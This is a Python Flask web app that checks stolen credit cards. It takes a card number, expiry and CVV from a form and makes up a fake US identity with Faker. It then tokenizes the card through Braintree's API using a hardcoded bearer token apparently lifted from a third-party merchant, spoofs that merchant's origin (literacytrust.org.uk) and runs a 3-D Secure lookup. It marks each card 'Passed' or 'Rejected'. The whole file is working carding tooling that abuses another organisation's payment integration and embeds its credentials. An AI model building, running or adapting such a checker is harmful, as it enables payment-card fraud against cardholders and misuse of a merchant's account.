from flask import Flask, render_template, request
import requests
from faker import Faker
import random
import json

app = Flask(__name__, template_folder='.')

fake = Faker("en_US")
domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]

def fetch_city_zipcode_data():
    url = "https://raw.githubusercontent.com/AbderrezakLzone/country-map/refs/heads/main/US/state.json"
    try:
        # Send a request to fetch the file
        response = requests.get(url)

        if response.status_code == 200:
            # Convert the content into JSON
            return response.json()
        else:
            print(f"ERROR: FAILED TO FETCH CITY ZIPCODE DATA {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"ERROR: FAILED TO FETCH CITY ZIPCODE DATA {e}")
        return False

def generate_random_person():

    # Use the function to fetch the data
    city_zipcode_data = fetch_city_zipcode_data()
    if not city_zipcode_data:
        return False

    state_name = random.choice(list(city_zipcode_data.keys()))
    city_name = random.choice(list(city_zipcode_data[state_name].keys()))
    zipcode = city_zipcode_data[state_name][city_name]
    
    phone = fake.phone_number()

    phone = phone.replace("(", "").replace(")", "").replace(" ", "").replace("-", "")
    if phone[:3] != zipcode[:3]:
        phone = f"({zipcode[:3]})-{phone[3:6]}-{phone[6:]}"

    return {
        'firstname': fake.first_name(),
        'lastname': fake.last_name(),
        'username': fake.user_name()[:10],
        'password': fake.password(),
        'email': f"{fake.user_name()[:10]}@{random.choice(domains)}",
        'phone': phone,
        'city': city_name,
        'country': "United States",
        'state': state_name,
        'zipcode': zipcode,
        'address': fake.street_address(),
        'useragent': fake.user_agent(),
    }

def get_token(card, month, year, cvv, random_person):
    headers = {
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzQ1MjI5NTAsImp0aSI6ImVjMjM5MmRiLTUxZTQtNGExYS1hOTE2LTBmM2RiM2NlNTBmYyIsInN1YiI6IjQ1OHc4NWJ3OHNidmh0ZmMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjQ1OHc4NWJ3OHNidmh0ZmMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.tgkaeiDnowrkF2iCeH3xr6KlEjq033FsnHi9xS5DW_M1PoqQhDgf-4itNXfSUl9N7nDoelUP0dASbTRBsKN05w',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'user-agent': random_person['useragent'],
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': fake.uuid4(),
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': f'{card}',
                    'expirationMonth': f'{month}',
                    'expirationYear': f'{year}',
                    'cvv': f'{cvv}',
                    'billingAddress': {
                        'postalCode': random_person['zipcode'],
                        'streetAddress': random_person['city'],
                    },
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data).text

    return response
    
def check_card(token, random_person, card):
    url = f"https://api.braintreegateway.com/merchants/458w85bw8sbvhtfc/client_api/v1/payment_methods/{token}/three_d_secure/lookup"

    payload = {
        "amount": 500,
        "additionalInfo": {
            "acsWindowSize": "03",
            "billingLine1": random_person['address'],
            "billingLine2": "",
            "billingPostalCode": random_person['zipcode'],
            "billingCountryCode": "US",
            "billingGivenName": random_person['firstname'],
            "billingSurname": random_person['lastname'],
            "email": random_person['email']
        },
        "bin": card[:6],
        "dfReferenceId": "0_517784fe-a34d-4a9f-9e5f-456e3f847bf5",
        "clientMetadata": {
            "requestedThreeDSecureVersion": "2",
            "sdkVersion": "web/3.99.0",
            "cardinalDeviceDataCollectionTimeElapsed": 104,
            "issuerDeviceDataCollectionTimeElapsed": 784,
            "issuerDeviceDataCollectionResult": True
        },
        "authorizationFingerprint": "eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzQ1MjI5NTAsImp0aSI6ImVjMjM5MmRiLTUxZTQtNGExYS1hOTE2LTBmM2RiM2NlNTBmYyIsInN1YiI6IjQ1OHc4NWJ3OHNidmh0ZmMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjQ1OHc4NWJ3OHNidmh0ZmMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.tgkaeiDnowrkF2iCeH3xr6KlEjq033FsnHi9xS5DW_M1PoqQhDgf-4itNXfSUl9N7nDoelUP0dASbTRBsKN05w",
        "braintreeLibraryVersion": "braintree/web/3.99.0",
        "_meta": {
            "merchantAppId": "literacytrust.org.uk",
            "platform": "web",
            "sdkVersion": "3.99.0",
            "source": "client",
            "integration": "custom",
            "integrationType": "custom",
            "sessionId": fake.uuid4()
        }
    }

    headers = {
        'User-Agent': random_person['useragent'],
        'Content-Type': "application/json",
        'origin': "https://literacytrust.org.uk",
    }

    response = requests.post(url, data=json.dumps(payload), headers=headers)

    if "threeDSecureInfo" in response.text:
        data = response.json()
        status = data.get("paymentMethod", {}).get("threeDSecureInfo", {}).get("status", "ERROR")
        return status
    else:
        print(f"ERROR: FAILED TO FETCH DATA {response.text}")
        return f"ERROR: FAILED TO FETCH DATA"
    
PASSED = '𝗣𝗮𝘀𝘀𝗲𝗱 ✅'
REJECTED = '𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌'
ERROR = '𝙀𝙍𝙍𝙊𝙍 ⚠️'

def process_payment(card, month, year, cvv):
    try:
        random_person = generate_random_person()
        if not random_person:
            return "ERROR: FAILED TO FETCH CITY ZIPCODE DATA"
        token_result = get_token(card, month, year, cvv, random_person)
        if 'tokencc_b' in token_result:
            data = json.loads(token_result)
            token = data['data']['tokenizeCreditCard']['token']
            result = check_card(token, random_person, card)
            return result
        else:
            print(f"ERROR: FAILED TO GETTING TOKEN {token_result}")
            return "ERROR: FAILED TO GETTING TOKEN"

    except Exception as e:
        print(f"ERROR: {e}")
        return f"ERROR: Unknown"
    
def parse_response(card, month, year, cvv):
    response = process_payment(card, month, year, cvv)
    if "ERROR" in response:
        return ERROR, response

    # Format response
    formatted_response = ' '.join(word.capitalize() for word in response.split('_'))
    if "Successful" in formatted_response:
        return PASSED, formatted_response
    
    if formatted_response in ["Lookup Card Error", "Lookup Error"]:
        return ERROR, formatted_response

    return REJECTED, formatted_response

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        card_number = request.form['card_number']
        exp_month = request.form['exp_month']
        exp_year = request.form['exp_year']
        cvv = request.form['cvv']

        status, response = parse_response(card_number, exp_month, exp_year, cvv)
        return render_template('result.html', status=status, response=response)

    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)
